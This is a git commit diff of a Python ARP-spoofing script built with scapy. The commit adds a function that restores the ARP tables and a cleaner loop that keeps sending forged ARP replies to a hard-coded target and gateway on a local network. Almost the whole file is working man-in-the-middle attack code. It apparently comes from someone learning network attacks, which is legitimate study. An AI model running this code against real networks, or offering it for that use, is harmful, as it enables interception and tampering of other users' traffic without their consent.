5ed3eb814e079839af09d021f078e7823dd6b443
212391750 <barry.dawson@ge.com>
2019-02-28 22:47:58 -0500

    added restore method

--- arp_spoof.py
+++ arp_spoof.py
@@ -2,26 +2,38 @@
 
 import scapy.all as scapy
 import time
-import sys
+
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
-    
     return answered_list[0][1].hwsrc
     
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst='b8:27:eb:df:fb:70', psrc=spoof_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst= target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst= destination_mac, psrc= source_ip, hwsrc= source_mac)
+    scapy.send(packet, count= 4, verbose= False)
+
+target_ip = '192.168.1.6'
+gateway_ip = '192.168.1.1'
+
 sent_packets_count = 0
-while True:
-    spoof('192.168.1.6', '192.168.1.1')
-    spoof('192.168.1.1', '192.168.1.6')
-    sent_packets_count = sent_packets_count + 2
-    print('\r[+] Packets sent: ' + str(sent_packets_count)),
-    sys.stdout.flush()
-    time.sleep(2)
+try:
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packets_count = sent_packets_count + 2
+        print('\r[+] Packets sent: ' + str(sent_packets_count), end ='')
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[-] Detected keyboard interupt. Resetting IP Tables...\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
